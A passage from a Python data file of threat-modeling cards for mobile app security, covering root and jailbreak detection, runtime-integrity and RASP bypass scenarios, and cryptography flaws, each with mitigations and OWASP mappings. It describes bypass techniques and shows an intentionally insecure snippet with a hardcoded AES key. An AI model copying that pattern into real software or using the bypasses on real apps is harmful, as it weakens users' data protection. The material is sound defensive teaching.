- Check for: `su` binary in common paths (`/system/bin/su`, `/system/xbin/su`), build tag (`ro.build.tags == test-keys`), dangerous system apps (SuperUser.apk), writable system partitions.
- `SafetyNet / Play Integrity API`: `MEETS_DEVICE_INTEGRITY` verdict; use server-side verification of the integrity token.
- Detect Magisk: check for Magisk Manager package, `/sbin/.magisk` path, or Magisk's socket interfaces.

**iOS (Jailbreak Detection)**
- Check for: Cydia/Sileo application bundle, writable `/private/`, presence of common Cydia Substrate paths, `sysctl` MIB for sandbox violation, `fork()` success (sandboxed processes cannot fork).
- `DCAppAttestService` (App Attest): server-verified attestation that the device is genuine and unmodified.
- Detect Frida: scan loaded dylibs for Frida agent paths, listen port 27042 check.

**Defensive Strategy**
- Root/jailbreak detection cannot be made absolute; hiding tools specifically counter known detection methods.
- Use detection as a risk signal that triggers server-side additional verification, not as a security boundary.
- Prioritize hardware-backed key storage: keys in Secure Enclave / StrongBox are not extractable even on jailbroken/rooted devices.

**Testing**
- Test on a jailbroken device with A-Bypass / RootCloak enabled; verify the app's core security controls (cryptographic operations) still require authentication.
- Verify the attestation token reaches the server and is verified.

**OWASP Mappings**
- MASVS: RESILIENCE-1
- MASTG: TEST-0045, TEST-0088, TEST-0240, TEST-0241, TEST-0324, TEST-0325
- MASWE: MASWE-0097, MASWE-0100
"""
}

CARDS["resilience/RSJ"] = {
"explanation": """\
## Scenario: Pekka can compromise the integrity of the storage because the file integrity checks are not strong enough according to what is recommended or the perceived effort of a potential attacker

Consider a scenario where Pekka modifies the app's local policy configuration file to change the transaction limit from $500 to $50,000. The app reads this file on startup, applies the limits, and then validates the file with a simple CRC32 checksum. Pekka recalculates the CRC32 for his modified file and replaces both the file and the checksum. The app's integrity check passes. Pekka now has a $50,000 transaction limit. The integrity check used a checksum algorithm that any attacker can compute.

1. CRC32 and MD5 are not cryptographic integrity checks; any attacker can compute them for modified content.
2. Symmetric HMAC keys stored on the device are accessible to a root attacker; computing a valid HMAC for modified content requires only the key.
3. File integrity checks that can be bypassed by modifying both the file and the stored hash provide no meaningful protection.

### Example

Pekka finds the app stores a `policy.json` and a `policy.hash` file. The `policy.hash` is an MD5 of `policy.json`. He modifies `policy.json` to increase transfer limits, computes a new MD5, writes both files, and restarts the app. The integrity check reads the hash, computes MD5 of the current file, compares them — they match. The modified policy is applied. The integrity mechanism was defeated by a third-grader with an MD5 implementation and root access.

## Threat Modeling

### STRIDE

This scenario falls under **Tampering**.

Pekka modifies stored policy or configuration data and bypasses the integrity check to make the app accept the modified data as legitimate.

### What can go wrong?

- Transaction limits, security policies, and feature flags stored locally and protected only by a weak checksum are modifiable.
- An attacker modifies the app's SQLite database and passes the weak integrity check, corrupting the app's data.
- Security-relevant configuration is modified to disable security controls.

### What are we going to do about it?

- Use a server-side signature (RSA or ECDSA) over all policy and configuration data; the app verifies the signature using the hardcoded public key.
- Store security policies server-side and fetch them with a verified TLS connection; do not store them in a locally modifiable file.
- For local integrity checks, use HMAC-SHA256 with a key that is hardware-protected (not derivable from on-device information alone).
- Do not store both the file and its integrity value in the same writable location; an attacker with write access to one has write access to both.
""",
"technical_note": """\
## Platform-Aware Review Guidance

**Android**
- For configuration integrity: sign the configuration JSON server-side with ECDSA and verify the signature in the app using the hardcoded public key.
- `KeyStore`-backed HMAC: generate an HMAC key in the Android Keystore (not extractable); use it to compute and verify HMACs over local files.
- SQLite database integrity: SQLCipher with a Keystore-derived key provides both encryption and implicit integrity (HMAC over each page).

**iOS**
- For configuration files: sign server-side with ECDSA; verify in app using `SecKeyVerifySignature` with the hardcoded public key.
- Keychain-stored HMAC keys: use `kSecAttrAccessibleWhenPasscodeSetThisDeviceOnly` to bind to the device; cannot be exported.
- `CommonCrypto.CCHmac` with a Keychain-protected key for local file HMAC.

**Testing**
- Modify a local configuration file; verify the app detects the tampering and refuses to apply the modified configuration.
- On a rooted device, replace the file and compute a new HMAC/checksum; verify the app's verification rejects the modification (because the key is hardware-protected and cannot be used to forge the HMAC).

**OWASP Mappings**
- MASVS: CODE-4, RESILIENCE-2
- MASTG: TEST-0002, TEST-0047, TEST-0090, TEST-0338, TEST-0387
- MASWE: MASWE-0105
"""
}

CARDS["resilience/RSQ"] = {
"explanation": """\
## Scenario: Titus can patch out critical functionality because the runtime integrity checks are not strong enough according to what is recommended or the perceived effort of a potential attacker

Consider a scenario where Titus wants to bypass the app's anti-cheat mechanism in a gaming app. The app checks at runtime that its own code has not been modified by computing a hash of loaded `classes.dex` and comparing it against a hardcoded expected value. Titus patches the hash comparison function to always return `true` using a binary patch. The integrity check now always passes, regardless of what code is running. The app loads Titus's modified version without complaint.

1. Runtime integrity checks implemented as single comparison functions are trivially NOP-patched.
2. Integrity check results stored in a local variable can be overridden with a debugger or instrumentation tool.
3. Integrity checks that run once at startup and store a boolean result can be patched at the check point; subsequent code reads the cached boolean.

### Example

Titus modifies the gaming app to inject a cheat module. The app's runtime integrity check computes a DEX hash and compares it in a function `boolean checkIntegrity()`. Titus patches the function's return instruction to always return `true`. The check passes. The cheat module runs. The integrity check was the only gate between the app's normal state and the modified state, and it was a single branch instruction.

## Threat Modeling

### STRIDE

This scenario falls under **Tampering**.

Titus modifies the running app and patches out the mechanism that would detect the modification, allowing the tampered version to run as if it were legitimate.

### What can go wrong?

- Cheat modules in gaming apps give unfair advantages and undermine the user community.
- Modified apps bypass anti-fraud, anti-cheat, or business logic controls.
- The patched integrity check allows all subsequent security controls that assume the code is unmodified to be bypassed.

### What are we going to do about it?

- Implement multiple, distributed integrity checks throughout the codebase; patching one does not satisfy all of them.
- Combine integrity check results: use the computed hash as a key-derivation input so that if the hash is wrong, the derived key is wrong, and the cryptographic operation fails — not just a boolean comparison.
- Report integrity failures to the server as a risk signal rather than terminating immediately (immediate termination is easy to patch to a NOP).
- Use Google Play Integrity API / App Attest to provide a server-verifiable, hardware-rooted integrity attestation.
""",
"technical_note": """\
## Platform-Aware Review Guidance

**Android**
- Self-integrity check: compute SHA-256 of `getApplicationContext().getPackageCodePath()` and compare against an expected value embedded in native code.
- Distribute checks across multiple native functions called from different places in the code; use indirect calls to make the check locations less obvious.
- Combine check with key derivation: `derivedKey = HKDF(masterKey, computedHash)` — if the hash is wrong, the key is wrong, and decryption fails naturally.
- Google Play Integrity API verdict `APP_INTEGRITY` includes binary integrity attestation; verify server-side.

**iOS**
- App Attest provides hardware-rooted attestation verified by Apple's servers; use it to confirm the binary is unmodified.
- Code signature verification is enforced by the OS on non-jailbroken devices.
- On jailbroken devices, integrity check bypass is possible; use attestation-based remote verification as the primary integrity control.

**Testing**
- Patch each integrity check to return `true`; verify that other controls (key derivation, server attestation) still detect the modification.
- Test the Play Integrity API / App Attest failure handling: simulate a failed attestation and verify the app escalates to remote verification.

**OWASP Mappings**
- MASVS: RESILIENCE-2, RESILIENCE-4
- MASTG: TEST-0048, TEST-0050, TEST-0091, TEST-0341, TEST-0354
- MASWE: MASWE-0107
"""
}

CARDS["resilience/RSK"] = {
"explanation": """\
## Scenario: Sherif can influence or alter controls against reverse engineering and runtime protection and can therefore bypass them

Consider a scenario where Sherif is a sophisticated attacker who has studied the app's resilience controls. He knows the app uses RASP (Runtime Application Self-Protection) and identifies the RASP library through static analysis. He finds the library's initialization function and hooks it with Frida, substituting a no-op version. The RASP library is loaded but never actually activates its protection routines. All subsequent security checks that the RASP library would have performed are silently skipped.

1. Third-party RASP libraries can be identified by their package names, method signatures, and string constants in the binary.
2. Hooking the initialization or policy-enforcement function of a protection library disables it comprehensively.
3. Protection libraries that perform one-time initialization are more vulnerable than those that check continuously.

### Example

Sherif identifies the RASP library from its well-known initialization string `"Protections initialized"`. He hooks the `initProtections()` method to return without performing any checks. He also hooks `isRooted()` to return `false` and `isDebuggerAttached()` to return `false`. The app now runs on a rooted device with a debugger attached, believing itself to be on a clean device with all protections active. The RASP was a single layer; once that layer was manipulated, nothing remained.

## Threat Modeling

### STRIDE

This scenario falls under **Tampering** and **Elevation of Privilege**.

Sherif disables the protective controls that would detect and respond to his attack, allowing him to proceed with reverse engineering, root exploitation, and data extraction without triggering any defensive response.

### What can go wrong?

- All resilience controls (anti-debugging, anti-tampering, root detection, emulator detection) are disabled by targeting the protection library.
- An attacker who can disable RASP has effectively removed all resilience protections in one operation.
- Protection feedback to the server is suppressed; the server believes the device is clean.

### What are we going to do about it?

- Distribute protection checks across the codebase rather than consolidating them in a single library; targeting one library does not disable all checks.
- Obfuscate the protection library's function names and symbols to make them harder to identify and target.
- Use hardware-backed cryptography as the ultimate protection; even if RASP is disabled, keys in Secure Enclave / StrongBox are not extractable.
- Report protection failures as risk signals to the server; a server that receives no protection signal after a period may itself be a signal.
""",
"technical_note": """\
## Platform-Aware Review Guidance

**Android**
- Distribute protection checks in multiple locations in the codebase; do not consolidate in one easily-targeted class.
- Obfuscate protection class and method names with ProGuard; use string obfuscation for detection strings.
- Implement protection checks in native code with symbol stripping to increase analysis difficulty.
- Use Play Integrity API for a server-verifiable, hardware-rooted integrity check that cannot be subverted by hooking.

**iOS**
- Use App Attest for server-verifiable attestation; it is verified by Apple's servers, not by on-device code.
- Distribute checks using Swift computed properties and lazy initializers spread across multiple files.
- Obfuscate check results: instead of `isJailbroken = true`, corrupt a key derivation input.

**Architectural Principle**
- Anti-tampering and anti-debugging controls are deterrents, not security boundaries.
- The primary security boundary must be hardware-backed key storage; resilience controls raise the cost of attacking that boundary.
- Document this distinction in the threat model; do not rely on resilience controls as the last line of defence for cryptographic keys or credentials.

**OWASP Mappings**
- MASVS: RESILIENCE-4
- MASTG: TEST-0046, TEST-0089
- MASWE: MASWE-0102, MASWE-0103
"""
}

CARDS["resilience/RSA"] = {
"explanation": """\
## Ace: You have invented a new attack against "Resilience"

This card invites your team to think creatively about novel threats to the app's resilience — its ability to detect, resist, and respond to attacks in hostile environments.

### What does this card ask you to do?

Invent a realistic new threat in the Resilience domain not already represented by RS2 through RSK. Consider:

- **New attack tooling:** A new dynamic analysis or exploitation tool has been released that bypasses a class of existing resilience controls. How would it affect this app?
- **Side-channel leakage from resilience controls themselves:** Does an anti-debugging check change the app's observable behaviour in a way that itself leaks information (e.g., timing differences, error messages)?
- **Attestation protocol weaknesses:** Are there scenarios where the Play Integrity API or App Attest verdict can be replayed, forged, or falsely obtained?
- **Supply-chain compromise of resilience libraries:** The RASP or integrity-check library is compromised upstream. How would this affect the app?
- **Legitimate tools used maliciously:** Screen readers, accessibility services, and MDM profiles are legitimate — can they be used to bypass resilience controls in ways the threat model did not consider?

### How to play this card

1. **Nominate a threat:** Propose a specific, plausible resilience bypass not covered by other RS cards.
2. **Name the attacker and victim:** What capabilities does the attacker have?
3. **Classify the threat (STRIDE):** Resilience attacks often involve Tampering or Elevation of Privilege.
4. **Assess likelihood and impact:** Is this realistic for your app's threat model?
5. **Propose a mitigation:** What change reduces the risk?
6. **Score the card:** A well-formed novel threat earns full points.

### Example starting prompts

- "A new version of Frida bypasses all current `_dyld` injection detection methods. How does this change our threat model?"
- "An enterprise MDM profile installs a trusted CA and enables USB debugging by policy. How does this affect our certificate pinning and anti-debugging assumptions?"
- "The Play Integrity API introduces a bug where a specific device model always returns `MEETS_DEVICE_INTEGRITY` even when rooted. How would we detect and respond to this?"

## Threat Modeling

### STRIDE

Varies by the invented attack.

### What can go wrong?

Resilience controls are in an ongoing arms race with attacker tooling. A control that is effective today may be bypassed by new tooling next quarter. The threat model must be reviewed with each major tool release and OS version.

### What are we going to do about it?

- Validate the invented threat against the current OWASP MASTG and MASVS.
- Document the threat and the agreed mitigation in the team's threat model register.
- Review whether the invented threat changes the risk rating of any other Resilience card.
""",
"technical_note": """\
## Guidance for Novel Resilience Threats

**Common areas for novel attacks**
- New versions of Frida, Magisk, or other tooling that bypass current detection heuristics.
- Attestation protocol edge cases (replay, device-specific bypasses, revocation failures).
- Supply-chain compromise of integrity libraries or signing infrastructure.
- Legitimate platform features (accessibility, MDM, enterprise VPN) enabling new bypass paths.

**Framing the attack**
- What resilience control does the threat bypass?
- What does an attacker gain by bypassing it?
- What is the next security boundary after the bypassed control?

**Mapping to standards**
- MASVS: RESILIENCE-1 through RESILIENCE-4
- MASTG: consult the Resilience test catalogue
- MASWE: check for an existing weakness entry

**OWASP Mappings**
- MASVS: determined by the invented threat
- MASTG: determined by the invented threat
- MASWE: determined by the invented threat
"""
}


# ─────────────────────────────────────────────────────────
# CRYPTOGRAPHY (CRM)
# ─────────────────────────────────────────────────────────

CARDS["cryptography/CRM2"] = {
"explanation": """\
## Scenario: Lesego can compromise cryptographic operations and resources because keys are reused for multiple purposes or not used according to the purpose for which they were created

Consider a scenario where Lesego discovers the target app uses a single master key for both encryption of stored data and for signing API requests. She extracts the key from a rooted device (it was not hardware-protected). She now has a key that signs valid API requests — because the developer reused the same key for both operations. Key reuse means key compromise has a multiplied blast radius.

1. Using the same key for encryption and signing violates the principle of cryptographic key separation.
2. Using a key beyond its intended purpose (e.g., using an authentication key for data encryption) creates unexpected security dependencies.
3. Key reuse across different app versions or users creates cross-context vulnerabilities.

### Example

Lesego observes that the app uses the same RSA key pair for TLS certificate authentication AND for signing financial transactions. She extracts the private key from a compromised device. She can now sign arbitrary transactions as if they originated from the legitimate user's device. The developer had reasoned that "it's the same key, so it's the same security." The security was the same — compromised in both contexts simultaneously.

## Threat Modeling

### STRIDE

This scenario falls under **Spoofing** and **Tampering**.

Key reuse means that compromise of a key used for one purpose immediately compromises all other operations that depend on the same key.

### What can go wrong?

- A key extracted for one purpose (e.g., analytics signing) can be used for another (e.g., transaction signing).
- Key rotation in one context does not protect the other contexts that shared the key.
- Cryptographic guarantees (separation of concern between confidentiality and authenticity) are violated.

### What are we going to do about it?

- Generate separate keys for each cryptographic purpose: separate keys for encryption, signing, authentication, and key derivation.
- Use key usage extensions (X.509 KeyUsage, Android KeyStore `setKeyUsages`) to restrict each key to its designated purpose.
- Implement key derivation from a master secret using HKDF with distinct info strings for each purpose (e.g., `HKDF(master, "data-encryption")`, `HKDF(master, "api-signing")`).
- Document the purpose of each cryptographic key in the key management registry.
""",
"technical_note": """\
## Platform-Aware Review Guidance

**Android KeyStore**
- `KeyGenParameterSpec.Builder.setKeyUsages(KeyProperties.PURPOSE_ENCRYPT | KeyProperties.PURPOSE_DECRYPT)` — restricts key to encryption/decryption only; a separate key must be generated for signing.
- Generate distinct `KeyStore` aliases for each purpose: `"app-data-encryption-key"`, `"app-api-signing-key"`, `"app-auth-key"`.
- For key derivation from a master secret: use `SecretKeyFactory.getInstance("PBKDF2WithHmacSHA256")` or HKDF with domain-separated info strings.

**iOS Keychain / Secure Enclave**
- Generate separate `SecKey` instances for each purpose; set `kSecAttrKeyUsage` (RSA) or appropriate flags.
- Secure Enclave keys are always asymmetric; derive symmetric keys using ECDH key agreement + HKDF.
- Use separate Keychain items with descriptive `kSecAttrLabel` for audit and key lifecycle management.

**Key Derivation**
- HKDF (RFC 5869): `HKDF-Expand(PRK, info="purpose-label", length)` — use distinct `info` strings to derive purpose-separated keys from a single master.
- Never use the same derived key for both encryption and HMAC.

**Testing**
- Enumerate all `KeyStore` aliases; verify no alias is used for multiple purposes.
- Review all `Cipher.getInstance()`, `Mac.getInstance()`, and `Signature.getInstance()` calls; verify each uses the appropriate purpose-specific key alias.

**OWASP Mappings**
- MASVS: AUTH-2, AUTH-3, CRYPTO-2
- MASTG: TEST-0015, TEST-0062, TEST-0307, TEST-0308
- MASWE: MASWE-0011, MASWE-0012, MASWE-0018
"""
}

CARDS["cryptography/CRM3"] = {
"explanation": """\
## Scenario: Emery can access data because it has been obfuscated rather than using an approved cryptographic function

Consider a scenario where Emery downloads the app and decompiles it. He finds that "encrypted" user data is actually Base64-encoded — the developer had called `Base64.encode()` and believed the data was protected. Emery decodes the "encrypted" data in seconds and reads every user's stored profile, including email addresses and birthdays. The encoding was reversible by anyone with internet access.

1. Base64 encoding is not encryption; it is a trivially reversible transformation.
2. XOR-with-fixed-key, ROT13, simple substitution ciphers, and similar "encoding" schemes provide no meaningful confidentiality.
3. Custom "scrambling" functions without a proven cryptographic foundation are security through obscurity.

### Example

Emery finds the app stores "encrypted" passwords as `eval(atob(data))` equivalents — actually just Base64. He decodes the stored values and finds them to be plaintexts. The developer had implemented `encode(password)` as `Base64.encodeToString(password.getBytes())`. This was labelled "encryption" in the code comments. Emery now has every stored credential in plaintext.

## Threat Modeling

### STRIDE

This scenario falls under **Information Disclosure**.

Data protected only by encoding (not encryption) provides no meaningful confidentiality guarantee. Anyone who knows or discovers the encoding scheme — which requires no secret — can reverse it.

### What can go wrong?

- "Encrypted" data is trivially decoded by any attacker who examines the stored bytes.
- Security assumptions built on the obfuscation scheme fail immediately when the scheme is discovered.
- Compliance requirements for encryption are not met by encoding.

### What are we going to do about it?

- Use approved, standards-based cryptographic algorithms: AES-256-GCM for symmetric encryption, RSA-OAEP for asymmetric encryption.
- Never use Base64, XOR, ROT13, or similar encoding schemes as a substitute for encryption.
- Store sensitive data encrypted with keys managed by the platform keystore, not derived from constants in the code.
""",
"technical_note": """\
## Platform-Aware Review Guidance

**Android**
- Cipher: `Cipher.getInstance("AES/GCM/NoPadding")` for authenticated encryption.
- Key management: `KeyStore`-backed `SecretKey` with `KeyGenParameterSpec.PURPOSE_ENCRYPT | PURPOSE_DECRYPT`.
- Static analysis: grep for `Base64.encode`, `XOR`, or custom `encode`/`scramble` methods applied to sensitive data.

**iOS**
- `CryptoKit.AES.GCM.seal(_:using:nonce:)` — authenticated encryption with a generated `SymmetricKey`.
- CommonCrypto: `CCCrypt(kCCEncrypt, kCCAlgorithmAES, kCCOptionPKCS7Padding, ...)` — use AES in an authenticated mode.
- Static analysis: grep for `Data.base64EncodedString()`, manual XOR loops, and custom "encryption" functions applied to sensitive data.

**Testing**
- Extract stored sensitive data and attempt base64/hex decoding; verify it does not yield plaintext.
- Decompile and search for encoding methods applied to sensitive values instead of cryptographic cipher calls.

**OWASP Mappings**
- MASVS: CRYPTO-1
- MASTG: TEST-0014, TEST-0061
- MASWE: (see MASVS references above)
"""
}

CARDS["cryptography/CRM4"] = {
"explanation": """\
## Scenario: Enselme can modify sensitive data (stored or in transit) because it is not subject to integrity checking

Consider a scenario where Enselme has root access to a device. The banking app stores the user's account tier (`"premium"`, `"standard"`) in an encrypted database. The encryption uses AES-CBC without any authentication tag. Enselme modifies a specific byte in the ciphertext using a bit-flipping attack on the CBC-mode ciphertext, changing the decrypted value from `"standard"` to `"premium"`. The app reads the decrypted (but modified) value without detecting the tampering, and grants Enselme premium features. The encryption provided confidentiality; it did not provide integrity.

1. CBC mode encryption without a MAC provides confidentiality but not integrity.
2. ECB mode additionally leaks data patterns and is trivially block-swappable.
3. Data signed only with a checksum (CRC32, MD5) can be forged by an attacker who can compute the same function.

### Example

Enselme intercepts a network response encrypted with AES-CBC. The response contains a `"admin": false` field. Using knowledge of the CBC structure and the predictable plaintext format, he flips the bit corresponding to `false` to `true` in the ciphertext. The app decrypts the modified ciphertext and processes `"admin": true`. The modification was undetected because no MAC was computed over the ciphertext. AES-CBC encrypted the data. It did not protect it from modification.

## Threat Modeling

### STRIDE

This scenario falls under **Tampering**.

Encryption without authentication allows an attacker who can modify the ciphertext to alter the plaintext in predictable ways (CBC bit-flipping) or substitute entire ciphertext blocks (ECB block substitution), tampering with the data without detection.

### What can go wrong?

- CBC bit-flipping attacks modify specific bytes of the decrypted plaintext.
- ECB block substitution reorders or replaces blocks of the decrypted data.
- Unauthenticated ciphertext in network responses is modified by an on-path attacker to alter application state.

### What are we going to do about it?

- Use authenticated encryption: AES-GCM or ChaCha20-Poly1305. These modes provide both confidentiality and integrity in a single primitive.
- If using AES-CBC for legacy compatibility, always apply Encrypt-then-MAC: compute HMAC-SHA256 over the ciphertext and IV, verify the MAC before decrypting.
- Never use ECB mode for any data that is more than one block in size.
""",
"technical_note": """\
## Platform-Aware Review Guidance

**Android**
- Preferred: `Cipher.getInstance("AES/GCM/NoPadding")` — AEAD mode, provides both encryption and integrity.
- GCM parameters: use a 96-bit (12-byte) random nonce; never reuse a nonce with the same key.
- If CBC is required for interoperability: `Mac.getInstance("HmacSHA256")` — compute over `IV || ciphertext` and verify before decryption.
- Lint/static analysis: flag `AES/CBC/PKCS5Padding` usage in code review.

**iOS**
- `CryptoKit.AES.GCM.seal(_:using:nonce:)` — authenticated encryption, returns `SealedBox` containing ciphertext + tag.
- `CryptoKit.ChaChaPoly.seal(_:using:nonce:)` — alternative AEAD cipher, often preferred for software implementations.
- CommonCrypto does not natively provide GCM; use CryptoKit (iOS 13+) or a vetted third-party library for GCM.

**Testing**
- Attempt to modify the ciphertext stored by the app; verify the app detects the modification (GCM authentication tag failure) and rejects the data.
- Review all `Cipher.getInstance()` calls for CBC mode usage; flag for authentication review.

**OWASP Mappings**
- MASVS: CODE-4, CRYPTO-1
- MASTG: TEST-0002
- MASWE: MASWE-0024, MASWE-0025, MASWE-0026
"""
}

CARDS["cryptography/CRM5"] = {
"explanation": """\
## Scenario: Orace can predict the seed value used for generating cryptographic keys, thereby compromising the cryptographic key

Consider a scenario where Orace discovers the app seeds the random number generator with `System.currentTimeMillis()`. The app generates a session key at login time. Orace knows the approximate login time (±5 minutes) from the server access log timestamp in an error response. He enumerates all millisecond timestamps in that 10-minute window — about 600,000 values — and for each, re-seeds the RNG and generates the key. One of those keys decrypts the captured session. The predictable seed made the key exhaustively searchable.

1. Seeding a PRNG with predictable values (time, device ID, user ID) makes the PRNG output predictable.
2. Using a non-CSPRNG (Pseudo-Random Number Generator) for cryptographic key generation produces keys that can be predicted by an attacker who knows the seed.
3. Using `Random` (Java) or `rand()` (C) instead of `SecureRandom` / `CSPRNG` produces weak cryptographic material.

### Example

Orace finds the app uses `new Random(System.nanoTime())` for generating an AES key. `System.nanoTime()` has limited entropy on many devices and is observable through timing side channels. He narrows down the nanoTime value to a range of a few thousand values using observable timing, enumerates the range, and recovers the key. The AES-256 key had only the entropy of the seed — far less than 256 bits.

## Threat Modeling

### STRIDE

This scenario falls under **Information Disclosure**.

A predictable seed produces a predictable key. An attacker who can predict or enumerate the seed can recover the key and decrypt all data protected by it.

### What can go wrong?

- Session keys, encryption keys, and cryptographic tokens are recoverable by an attacker who predicts the RNG seed.
- Token enumeration: if tokens are generated from a predictable PRNG, they can be enumerated to find valid tokens.
- All data encrypted with the predictable key is retroactively compromised once the seed is recovered.

### What are we going to do about it?

- Use `SecureRandom` (Android) or `SecRandomCopyBytes` / `CryptoKit` random functions (iOS) for all cryptographic key generation.
- Never seed `SecureRandom` with a predictable value; the default constructor uses OS entropy.
- Never use `java.util.Random`, `Math.random()`, `rand()`, or `srand(time(NULL))` for cryptographic purposes.
""",
"technical_note": """\
## Platform-Aware Review Guidance

**Android**
- `SecureRandom secureRandom = new SecureRandom()` — uses `/dev/urandom` entropy; do not call `setSeed()` with a fixed value.
- `KeyGenerator` backed by `KeyStore`: the key is generated by the secure hardware using hardware entropy; no application-level RNG is involved.
- Static analysis: grep for `new Random(`, `Math.random()`, `System.currentTimeMillis()` or `System.nanoTime()` used in cryptographic contexts.

**iOS**
- `CryptoKit.SymmetricKey(size:)` — generates a key using secure system entropy.
- `SecRandomCopyBytes(kSecRandomDefault, count, bytes)` — hardware-backed randomness.
- `arc4random_buf()` — acceptable for non-security uses; use `SecRandomCopyBytes` for cryptographic material.
- Never use `drand48()`, `rand()`, or `random()` for cryptographic purposes.

**Testing**
- Review all key-generation code for use of non-CSPRNG sources.
- Generate a large number of tokens/keys in a test environment and check for statistical patterns (birthday collisions at low counts, non-uniform distribution).

**OWASP Mappings**
- MASVS: CRYPTO-1, CRYPTO-2
- MASTG: TEST-0016, TEST-0061, TEST-0063, TEST-0204, TEST-0205, TEST-0208, TEST-0209, TEST-0311, TEST-0349
- MASWE: MASWE-0009, MASWE-0027
"""
}

CARDS["cryptography/CRM6"] = {
"explanation": """\
## Scenario: Kouti can extract sensitive data because the cryptographic key is hardcoded or stored insecurely in local, internal, or external storage

Consider a scenario where Kouti decompiles the app and finds a string constant `private static final String KEY = "MyS3cr3tK3y1234!"`. This is the AES key used to encrypt all stored user data. The key is in the APK. The APK is downloadable from the Play Store. Kouti decrypts every user's data. The encryption was correct. The key management was not.

1. Hardcoded keys in the APK/IPA binary are extractable by static analysis.
2. Keys stored in `SharedPreferences`, `NSUserDefaults`, or unprotected files on internal storage are accessible on rooted/jailbroken devices.
3. Keys derived from static values (app name, package name, user ID) are predictable.

### Example

Kouti uses jadx to decompile the app and searches for `AES`, `Cipher`, and `Key` in the decompiled source. She finds:
```java
private static final byte[] KEY = "th1s1sth3k3y1234".getBytes();
Cipher c = Cipher.getInstance("AES/CBC/PKCS5Padding");
c.init(Cipher.ENCRYPT_MODE, new SecretKeySpec(KEY, "AES"));
```
She copies the key, decrypts the captured ciphertext from a backup, and reads all stored user data. The encryption algorithm was standard. The key storage was not.

## Threat Modeling

### STRIDE

This scenario falls under **Information Disclosure**.

A hardcoded or insecurely stored key is equivalent to no key at all for an attacker who can access the app binary or device storage. All data encrypted with the exposed key is retroactively compromised.

### What can go wrong?

- All data encrypted with the hardcoded key is decryptable by anyone who decompiles the app.
- A key stored in `SharedPreferences` or an unprotected file is readable by any app with root access.
- Key rotation is impossible for hardcoded keys; all historical data is permanently compromised.

### What are we going to do about it?

- Generate cryptographic keys using the platform's hardware-backed keystore: Android `KeyStore`, iOS Secure Enclave.
- Never hardcode cryptographic keys, passwords, or key-derivation inputs in source code or configuration files.
- For keys that must be distributed (e.g., server public keys), pin the public key in the binary — it is not secret — and use asymmetric encryption.
- For symmetric keys that must be derived: use PBKDF2 or Argon2 with a user-provided password and a hardware-bound salt; never use a static salt.
""",
"technical_note": """\
## Platform-Aware Review Guidance

**Android**
- Generate keys in the `KeyStore`: `KeyGenerator.getInstance("AES", "AndroidKeyStore")`.
- Keys generated in the `AndroidKeyStore` cannot be exported; they are hardware-protected on devices with StrongBox or TEE.
- Static analysis: grep for `SecretKeySpec`, `new byte[] { ... }`, string constants adjacent to `Cipher.getInstance` calls.
- MobSF: "Hardcoded Secrets" finding.

**iOS**
- `CryptoKit.SymmetricKey(size:)` — generate a new key at first run and store it in the Keychain with `kSecAttrAccessibleWhenPasscodeSetThisDeviceOnly`.
- For Secure Enclave operations: generate an asymmetric key with `kSecAttrTokenIDSecureEnclave`; private key never leaves the Enclave.
- Static analysis: grep for hardcoded byte arrays or strings near `CCCrypt`, `SecKeyEncrypt`, or `AES.GCM.seal`.

**Testing**
- Decompile the APK/IPA and search for hardcoded key material: constant byte arrays, Base64-encoded strings of key length near cryptographic API calls.
- On a rooted/jailbroken device, extract `SharedPreferences` / `UserDefaults` and check for key material.

**OWASP Mappings**
- MASVS: AUTH-1, CRYPTO-1, CRYPTO-2, NETWORK-1, STORAGE-1
- MASTG: TEST-0001, TEST-0013, TEST-0052, TEST-0062, TEST-0212, TEST-0213, TEST-0214
- MASWE: MASWE-0005, MASWE-0014, MASWE-0017, MASWE-0036
"""
}

CARDS["cryptography/CRM7"] = {
"explanation": """\
## Scenario: Ramsey can access stored sensitive data because it is not securely encrypted

Consider a scenario where Ramsey uses ADB to pull a backup from a test device. The health app stores patient records in a SQLite database with no encryption. The database file is readable with SQLite Browser. Ramsey reads every patient record stored on the device. The developer had planned to "add encryption later." Later had not arrived.

1. Sensitive data stored without encryption is readable by anyone with file access.
2. Data stored encrypted but with a hardcoded key provides the appearance of encryption without the security.
3. Data protected only by OS file permissions is readable on rooted/jailbroken devices.

### Example

Ramsey connects a rooted Android device to his computer. He navigates to `/data/data/com.health.app/databases/`. He finds `patients.db`. He opens it with SQLite Browser. Every patient record — name, date of birth, diagnosis, medication — is in plaintext. The developer's comment in the schema file: `// TODO: encrypt database`. The TODO had 47 commits above it without being addressed.

## Threat Modeling

### STRIDE

This scenario falls under **Information Disclosure**.

Unencrypted stored sensitive data is readable by any party who can access the storage medium: a rooted device user, a backup reader, a forensics tool, or the next person to own the device.

### What can go wrong?

- Sensitive data (health records, financial details, personal information) is read from an unencrypted database.
- Backup files contain unencrypted sensitive data.
- Regulatory requirements (HIPAA, GDPR) for data encryption at rest are violated.

### What are we going to do about it?

- Encrypt all sensitive data at rest using a key stored in the platform keystore, not derived from the package name or a constant.
- Use SQLCipher for SQLite databases requiring encryption, with the encryption key from the Android `KeyStore` or iOS Keychain.
- Apply the appropriate iOS data protection class (`NSFileProtectionComplete`) to all files containing sensitive data.
- Treat the device's OS-level file permissions as insufficient for sensitive data; apply application-level encryption.
""",
"technical_note": """\
## Platform-Aware Review Guidance

**Android**
- SQLCipher: encrypt SQLite databases with a key from the `KeyStore`. `SQLiteDatabase.openOrCreateDatabase(path, passphrase, ...)`.
- Room + SQLCipher: `SupportFactory(passphrase)` in `Room.databaseBuilder`.
- `EncryptedSharedPreferences` / `EncryptedFile` from Jetpack Security: AES-256-GCM encryption backed by the `KeyStore`.
- External storage files should not contain sensitive data; if they must, apply application-level encryption before writing.

**iOS**
- `NSFileProtectionComplete` for sensitive files: encrypted when the device is locked; set via `setAttributes([.protectionKey: FileProtectionType.complete], ofItemAtPath:)`.
- Keychain: stores small amounts of sensitive data (tokens, keys, passwords) with built-in encryption and access control.
- CoreData with SQLite backing: does not encrypt by default; use SQLCipher-CoreData integration for at-rest encryption, or encrypt sensitive attributes individually.

**Testing**
- On a rooted/jailbroken device, access the app's database file and verify it is not readable as plaintext.
- Pull an ADB backup and inspect all files for plaintext sensitive data.

**OWASP Mappings**
- MASVS: CRYPTO-2, STORAGE-1
- MASTG: TEST-0001, TEST-0013, TEST-0052, TEST-0062, TEST-0072, TEST-0079, TEST-0207, TEST-0287, TEST-0299, TEST-0300, TEST-0301, TEST-0302, TEST-0304, TEST-0305, TEST-0306, TEST-0388
- MASWE: MASWE-0006
"""
}

